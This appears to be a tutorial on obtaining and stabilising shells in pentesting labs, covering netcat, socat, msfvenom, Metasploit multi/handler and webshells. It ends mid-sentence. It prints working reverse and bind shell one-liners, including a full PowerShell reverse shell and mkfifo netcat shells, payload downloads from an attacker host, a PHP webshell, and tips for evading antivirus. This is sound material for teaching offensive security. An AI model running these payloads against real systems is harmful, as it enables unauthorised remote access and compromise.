&lt;p&gt;Notice that after running the command on the right, the listener receives a connection. When the whoami command is run, we see that we are executing commands as the target user. The important thing here is that we are listening on our own attacking machine, and sending a connection from the target.
Bind Shell example:&lt;/p&gt;

&lt;p&gt;Bind shells are less common, but still very useful.&lt;/p&gt;

&lt;p&gt;Once again, take a look at the following image. Again, on the left we have the attacker’s computer, on the right we have a simulated target. Just to shake things up a little, we’ll use a Windows target this time. First, we start a listener on the target – this time we’re also telling it to execute cmd.exe. Then, with the listener up and running, we connect from our own machine to the newly opened port.&lt;/p&gt;

&lt;p&gt;On the target:&lt;/p&gt;

&lt;p&gt;nc -lvnp &lt;port&gt; -e &quot;cmd.exe&quot;&lt;/port&gt;&lt;/p&gt;

&lt;p&gt;On the attacking machine:&lt;/p&gt;

&lt;p&gt;nc MACHINE_IP &lt;port&gt;&lt;/port&gt;&lt;/p&gt;

&lt;p&gt;As you can see, this once again gives us code execution on the remote machine. Note that this is not specific to Windows.&lt;/p&gt;

&lt;p&gt;The important thing to understand here is that we are listening on the target, then connecting to it with our own machine.&lt;/p&gt;

&lt;p&gt;The final concept which is relevant in this task is that of interactivity. Shells can be either interactive or non-interactive.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Interactive: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to
interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:

Here you can see that it's asking interactively that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.


Non-Interactive shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:

Notice that the whoami command (which is non-interactive) executes perfectly, but the ssh command (which is interactive) gives us no output at all. As an interesting side note, the output of an interactive command does go somewhere, however, figuring out where is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells. 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Additionally, in various places throughout this task you will see a command in the screenshots called listener. This command is an alias unique to the attacking machine used for demonstrations, and is a shorthand way of typing sudo rlwrap nc -lvnp 443, which will be covered in upcoming tasks. It will not work on any other machine unless the alias has been configured locally.&lt;/p&gt;

&lt;h1 id=&quot;netcat&quot;&gt;Netcat&lt;/h1&gt;

&lt;p&gt;As mentioned previously, Netcat is the most basic tool in a pentester’s toolkit when it comes to any kind of networking. With it we can do a wide variety of interesting things, but let’s focus for now on shells.&lt;/p&gt;

&lt;p&gt;Reverse Shells&lt;/p&gt;

&lt;p&gt;In the previous task we saw that reverse shells require shellcode and a listener. There are many ways to execute a shell, so we’ll start by looking at listeners.&lt;/p&gt;

&lt;p&gt;The syntax for starting a netcat listener using Linux is this:&lt;/p&gt;

&lt;p&gt;nc -lvnp &lt;port-number&gt;&lt;/port-number&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-l is used to tell netcat that this will be a listener
-v is used to request a verbose output
-n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
-p indicates that the port specification will follow.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The example in the previous task used port 4444. Realistically you could use any port you like, as long as there isn’t already a service using it. Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener. That said, it’s often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.&lt;/p&gt;

&lt;p&gt;A working example of this would be:&lt;/p&gt;

&lt;p&gt;sudo nc -lvnp 443&lt;/p&gt;

&lt;p&gt;We can then connect back to this with any number of payloads, depending on the environment on the target.&lt;/p&gt;

&lt;p&gt;An example of this is displayed in the previous task.&lt;/p&gt;

&lt;p&gt;Bind Shells&lt;/p&gt;

&lt;p&gt;If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. The syntax for this is relatively straight forward:&lt;/p&gt;

&lt;p&gt;nc &lt;target-ip&gt; &lt;chosen-port&gt;&lt;/chosen-port&gt;&lt;/target-ip&gt;&lt;/p&gt;

&lt;p&gt;Here we are using netcat to make an outbound connection to the target on our chosen port.&lt;/p&gt;

&lt;p&gt;We will look at using netcat to create a listener for this type of shell in Task 8. What’s important here is that you understand how to connect to a listening port using netcat.&lt;/p&gt;

&lt;h1 id=&quot;netcat-shell-stabilisation&quot;&gt;Netcat Shell Stabilisation&lt;/h1&gt;

&lt;p&gt;Ok, so we’ve caught or connected to a netcat shell, what next?&lt;/p&gt;

&lt;p&gt;These shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat “shells” really being processes running inside a terminal, rather than being bonafide terminals in their own right. Fortunately, there are many ways to stabilise netcat shells on Linux systems. We’ll be looking at three here. Stabilisation of Windows reverse shells tends to be significantly harder; however, the second technique that we’ll be covering here is particularly useful for it.&lt;/p&gt;

&lt;p&gt;Technique 1: Python&lt;/p&gt;

&lt;p&gt;The first technique we’ll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The first thing to do is use python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)', which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
Step two is: export TERM=xterm -- this will give us access to term commands such as clear.
Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process. 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The full technique can be seen here:&lt;/p&gt;

&lt;p&gt;Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.&lt;/p&gt;

&lt;p&gt;Technique 2: rlwrap&lt;/p&gt;

&lt;p&gt;rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with sudo apt install rlwrap.&lt;/p&gt;

&lt;p&gt;To use rlwrap, we invoke a slightly different listener:&lt;/p&gt;

&lt;p&gt;rlwrap nc -lvnp &lt;port&gt;&lt;/port&gt;&lt;/p&gt;

&lt;p&gt;Prepending our netcat listener with “rlwrap” gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it’s possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell.&lt;/p&gt;

&lt;p&gt;Technique 3: Socat&lt;/p&gt;

&lt;p&gt;The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (sudo python3 -m http.server 80), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat).&lt;/LOCAL-IP&gt;&lt;/p&gt;

&lt;p&gt;For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.&lt;/LOCAL-IP&gt;&lt;/p&gt;

&lt;p&gt;With any of the above techniques, it’s useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.&lt;/p&gt;

&lt;p&gt;First, open another terminal and run stty -a. This will give you a large stream of output. Note down the values for “rows” and columns:&lt;/p&gt;

&lt;p&gt;Next, in your reverse/bind shell, type in:&lt;/p&gt;

&lt;p&gt;stty rows &lt;number&gt;&lt;/number&gt;&lt;/p&gt;

&lt;p&gt;and&lt;/p&gt;

&lt;p&gt;stty cols &lt;number&gt;&lt;/number&gt;&lt;/p&gt;

&lt;p&gt;Filling in the numbers you got from running the command in your own terminal.&lt;/p&gt;

&lt;p&gt;This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.&lt;/p&gt;

&lt;h1 id=&quot;socat&quot;&gt;Socat&lt;/h1&gt;

&lt;p&gt;Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points – much like the portal gun from the Portal games!&lt;/p&gt;

&lt;p&gt;Once again, let’s start with reverse shells.&lt;/p&gt;

&lt;p&gt;Reverse Shells&lt;/p&gt;

&lt;p&gt;As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here’s the syntax for a basic reverse shell listener in socat:&lt;/p&gt;

&lt;p&gt;socat TCP-L:&lt;port&gt; -&lt;/port&gt;&lt;/p&gt;

&lt;p&gt;As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to nc -lvnp &lt;port&gt;.&lt;/port&gt;&lt;/p&gt;

&lt;p&gt;On Windows we would use this command to connect back:&lt;/p&gt;

&lt;p&gt;socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes&lt;/LOCAL-PORT&gt;&lt;/LOCAL-IP&gt;&lt;/p&gt;

&lt;p&gt;The “pipes” option is used to force powershell (or cmd.exe) to use Unix style standard input and output.&lt;/p&gt;

&lt;p&gt;This is the equivalent command for a Linux Target:&lt;/p&gt;

&lt;p&gt;socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:&quot;bash -li&quot;&lt;/LOCAL-PORT&gt;&lt;/LOCAL-IP&gt;&lt;/p&gt;

&lt;p&gt;Bind Shells&lt;/p&gt;

&lt;p&gt;On a Linux target we would use the following command:&lt;/p&gt;

&lt;p&gt;socat TCP-L:&lt;PORT&gt; EXEC:&quot;bash -li&quot;&lt;/PORT&gt;&lt;/p&gt;

&lt;p&gt;On a Windows target we would use this command for our listener:&lt;/p&gt;

&lt;p&gt;socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes&lt;/PORT&gt;&lt;/p&gt;

&lt;p&gt;We use the “pipes” argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.&lt;/p&gt;

&lt;p&gt;Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.&lt;/p&gt;

&lt;p&gt;socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -&lt;/TARGET-PORT&gt;&lt;/TARGET-IP&gt;&lt;/p&gt;

&lt;p&gt;Now let’s take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is significantly more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:&lt;/p&gt;

&lt;p&gt;socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0&lt;/port&gt;&lt;/p&gt;

&lt;p&gt;Let’s break this command down into its two parts. As usual, we’re connecting two points together. In this case those points are a listening port, and a file. Specifically, we are allocating a new tty, and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell – with the added bonus of being immediately stable and allocating a full tty.&lt;/p&gt;

&lt;p&gt;The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it’s possible to upload a precompiled socat binary, which can then be executed as normal.&lt;/p&gt;

&lt;p&gt;The special command is as follows:&lt;/p&gt;

&lt;p&gt;socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane&lt;/attacker-port&gt;&lt;/attacker-ip&gt;&lt;/p&gt;

&lt;p&gt;This is a handful, so let’s break it down.&lt;/p&gt;

&lt;p&gt;The first part is easy – we’re linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:”bash -li”. We’re also passing the arguments: pty, stderr, sigint, setsid and sane:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pty, allocates a pseudoterminal on the target -- part of the stabilisation process
stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
setsid, creates the process in a new session
sane, stabilises the terminal, attempting to &quot;normalise&quot; it.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That’s a lot to take in, so let’s see it in action.&lt;/p&gt;

&lt;p&gt;As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:&lt;/p&gt;

&lt;p&gt;Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.&lt;/p&gt;

&lt;p&gt;If, at any point, a socat shell is not working correctly, it’s well worth increasing the verbosity by adding -d -d into the command. This is very useful for experimental purposes, but is not usually necessary for general use.&lt;/p&gt;

&lt;h1 id=&quot;socat-encrypted-shells&quot;&gt;Socat Encrypted Shells&lt;/h1&gt;

&lt;p&gt;One of the many great things about socat is that it’s capable of creating encrypted shells – both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass antivirus software as a result.&lt;/p&gt;

&lt;p&gt;We covered how to create basic shells in the previous task, so that syntax will not be covered again here. Suffice to say that any time TCP was used as part of a command, this should be replaced with OPENSSL when working with encrypted shells. We’ll cover a few examples at the end of the task, but first let’s talk about certificates.&lt;/p&gt;

&lt;p&gt;We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:&lt;/p&gt;

&lt;p&gt;openssl req –newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt&lt;/p&gt;

&lt;p&gt;This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
We then need to merge the two created files into a single .pem file:&lt;/p&gt;

&lt;p&gt;cat shell.key shell.crt &amp;gt; shell.pem&lt;/p&gt;

&lt;p&gt;Now, when we set up our reverse shell listener, we use:&lt;/p&gt;

&lt;p&gt;socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -&lt;/PORT&gt;&lt;/p&gt;

&lt;p&gt;This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.&lt;/p&gt;

&lt;p&gt;To connect back, we would use:&lt;/p&gt;

&lt;p&gt;socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash&lt;/LOCAL-PORT&gt;&lt;/LOCAL-IP&gt;&lt;/p&gt;

&lt;p&gt;The same technique would apply for a bind shell:&lt;/p&gt;

&lt;p&gt;Target:&lt;/p&gt;

&lt;p&gt;socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes&lt;/PORT&gt;&lt;/p&gt;

&lt;p&gt;Attacker:&lt;/p&gt;

&lt;p&gt;socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -&lt;/TARGET-PORT&gt;&lt;/TARGET-IP&gt;&lt;/p&gt;

&lt;p&gt;Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.&lt;/p&gt;

&lt;p&gt;The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:&lt;/p&gt;

&lt;p&gt;This technique will also work with the special, Linux-only TTY shell covered in the previous task – figuring out the syntax for this will be the challenge for this task. Feel free to use the Linux Practice box (deployable at the end of the room) to experiment if you’re struggling to obtain the answer.&lt;/p&gt;

&lt;h1 id=&quot;common-shell-payloads&quot;&gt;Common Shell Payloads&lt;/h1&gt;

&lt;p&gt;We’ll soon be looking at generating payloads with msfvenom, but before we do that, let’s take a look at some common payloads using the tools we’ve already covered.&lt;/p&gt;

&lt;p&gt;A previous task mentioned that we’d be looking at some ways to use netcat as a listener for a bindshell, so we’ll start with that. In some versions of netcat (including the nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries, and the version used in Kali itself: netcat-traditional) there is a -e option which allows you to execute a process on connection. For example, as a listener:&lt;/p&gt;

&lt;p&gt;nc -lvnp &lt;PORT&gt; -e /bin/bash&lt;/PORT&gt;&lt;/p&gt;

&lt;p&gt;Connecting to the above listener with netcat would result in a bind shell on the target.&lt;/p&gt;

&lt;p&gt;Equally, for a reverse shell, connecting back with nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash would result in a reverse shell on the target.&lt;/PORT&gt;&lt;/LOCAL-IP&gt;&lt;/p&gt;

&lt;p&gt;However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:&lt;/p&gt;

&lt;p&gt;mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &amp;lt; /tmp/f | /bin/sh &amp;gt;/tmp/f 2&amp;gt;&amp;1; rm /tmp/f&lt;/PORT&gt;&lt;/p&gt;

&lt;p&gt;The following paragraph is the technical explanation for this command. It’s slightly above the level of this room, so don’t worry if it doesn’t make much sense for now – the command itself is what matters.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The command first creates a named pipe at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A very similar command can be used to send a netcat reverse shell:&lt;/p&gt;

&lt;p&gt;mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &amp;lt; /tmp/f | /bin/sh &amp;gt;/tmp/f 2&amp;gt;&amp;1; rm /tmp/f&lt;/PORT&gt;&lt;/LOCAL-IP&gt;&lt;/p&gt;

&lt;p&gt;This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.&lt;/p&gt;

&lt;p&gt;When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we’ll be covering the standard one-liner PSH reverse shell here.&lt;/p&gt;

&lt;p&gt;This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:&lt;/p&gt;

&lt;p&gt;powershell -c “$client = New-Object System.Net.Sockets.TCPClient(‘&lt;ip&gt;',&lt;port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&amp;gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;&lt;/port&gt;&lt;/ip&gt;&lt;/p&gt;

&lt;p&gt;In order to use this, we need to replace “&lt;IP&gt;&quot; and &quot;&lt;port&gt;&quot; with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:&lt;/port&gt;&lt;/IP&gt;&lt;/p&gt;

&lt;p&gt;For other common reverse shell payloads, Payloads all the Things is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages. It is well worth reading through the linked page to see what’s available.&lt;/p&gt;

&lt;h1 id=&quot;msfvenom&quot;&gt;msfvenom&lt;/h1&gt;

&lt;p&gt;Msfvenom: the one-stop-shop for all things payload related.&lt;/p&gt;

&lt;p&gt;Part of the Metasploit framework, msfvenom is used to generate code for, primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. .exe, .aspx, .war, .py). It’s this latter function that we will be making use of in this room. There is more to teach about msfvenom than could ever be fit into a single room, let alone a single task, so the following information will be a brief introduction to the concepts that will prove useful for this room.&lt;/p&gt;

&lt;p&gt;The standard syntax for msfvenom is as follows:&lt;/p&gt;

&lt;p&gt;msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;&lt;/OPTIONS&gt;&lt;/PAYLOAD&gt;&lt;/p&gt;

&lt;p&gt;For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:&lt;/p&gt;

&lt;p&gt;msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;&lt;/listen-port&gt;&lt;/listen-IP&gt;&lt;/p&gt;

&lt;p&gt;Here we are using a payload and four options:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-f &amp;lt;format&amp;gt;
    Specifies the output format. In this case that is an executable (exe)
-o &amp;lt;file&amp;gt;
    The output location and filename for the generated payload.
LHOST=&amp;lt;IP&amp;gt;
    Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
LPORT=&amp;lt;port&amp;gt;
    The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Staged vs Stageless&lt;/p&gt;

&lt;p&gt;Before we go any further, there are another two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and downloads the actual payload. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.
Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discovery and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by antivirus software.&lt;/p&gt;

&lt;p&gt;Meterpreter&lt;/p&gt;

&lt;p&gt;On the subject of Metasploit, another important thing to discuss is a Meterpreter shell. Meterpreter shells are Metasploit’s own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit’s post-exploitation tools then we need to use a meterpreter shell, however, that is a topic for another time. The downside to meterpreter shells is that they must be caught in Metasploit. They are also banned from certain certification examinations, so it’s a good idea to learn alternative methodologies.&lt;/p&gt;

&lt;p&gt;Payload Naming Conventions&lt;/p&gt;

&lt;p&gt;When working with msfvenom, it’s important to understand how the naming system works. The basic convention is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;&amp;lt;OS&amp;gt;/&amp;lt;arch&amp;gt;/&amp;lt;payload&amp;gt;

For example:

linux/x86/shell_reverse_tcp

This would generate a stageless reverse shell for an x86 Linux target.

The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:

windows/shell_reverse_tcp

For a 64bit Windows target, the arch would be specified as normal (x64).

Let's break the payload section down a little further.
In the above examples the payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be:

shell/reverse_tcp

As staged payloads are denoted with another forward slash (/).

This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:

windows/x64/meterpreter/reverse_tcp

A Linux 32bit stageless Meterpreter payload would look like this:

linux/x86/meterpreter_reverse_tcp

Aside from the msfconsole man page, the other important thing to note when working with msfvenom is:

msfvenom --list payloads

This can be used to list all available payloads, which can then be piped into grep to search for a specific set of payloads. For example:

This gives us a full set of Linux meterpreter payloads for 32bit targets.

# Metasploit mult/handler

Multi/Handler is a superb tool for catching reverse shells. It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads.

Fortunately, it's relatively easy to use:

    Open Metasploit with msfconsole
    Type use multi/handler, and press enter

We are now primed to start a multi/handler session. Let's take a look at the available options using the options command:

There are three options we need to set: payload, LHOST and LPORT. These are all identical to the options we set when generating  shellcode with Msfvenom -- a payload specific to our target, as well as a listening address and port with which we can receive a shell. Note that the LHOST must be specified here, as metasploit will not listen on all network interfaces like netcat or socat will; it must be told a specific address to listen with (when using TryHackMe, this will be your tun0 address). We set these options with the following commands:

    set PAYLOAD &amp;lt;payload&amp;gt;
    set LHOST &amp;lt;listen-address&amp;gt;
    set LPORT &amp;lt;listen-port&amp;gt;

We should now be ready to start the listener!

Let's do this by using the exploit -j command. This tells Metasploit to launch the module, running as a job in the background.


You may notice that in the above screenshot, Metasploit is listening on a port under 1024. To do this, Metasploit must be run with sudo permissions.

When the staged payload generated in the previous task is run, Metasploit receives the connection, sending the remainder of the payload and giving us a reverse shell:

Notice that, because the multi/handler was originally backgrounded, we needed to use sessions 1 to foreground it again. This worked as it was the only session running. Had there been other sessions active, we would have needed to use sessions to see all active sessions, then use sessions &amp;lt;number&amp;gt; to select the appropriate session to foreground. This number would also have been displayed in the line where the shell was opened (see &quot;Command Shell session 1 opened&quot;).

# WebShell

There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a webshell. See the Upload Vulnerabilities Room for a more extensive look at this concept.

&quot;Webshell&quot; is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage -- either through a HTML form, or directly as arguments in the URL -- which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.

As PHP is still the most common server side scripting language, let's have a look at some simple code for this.

In a very basic one line format:

&amp;lt;?php echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_GET[&quot;cmd&quot;]) . &quot;&amp;lt;/pre&amp;gt;&quot;; ?&amp;gt;

This will take a GET parameter in the URL and execute it on the system with shell_exec(). Essentially, what this means is that any commands we enter in the URL after ?cmd= will be executed on the system -- be it Windows or Linux. The &quot;pre&quot; elements are to ensure that the results are formatted correctly on the page.

Let's see this in action:

Notice that when navigating the shell, we used a GET parameter &quot;cmd&quot; with the command &quot;ifconfig&quot;, which correctly returned the network information of the box. In other words, by entering the ifconfig command (used to check the network interfaces on a Linux target) into the URL of our shell, it was executed on the system, with the results returned to us. This would work for any other command we chose to use (e.g. whoami, hostname, arch, etc).

As mentioned previously, there are a variety of webshells available on Kali by default at /usr/share/webshells -- including the infamous PentestMonkey php-reverse-shell -- a full reverse shell written in PHP. Note that most generic, language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers. They will not work on Windows by default.

When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the cmd argument:

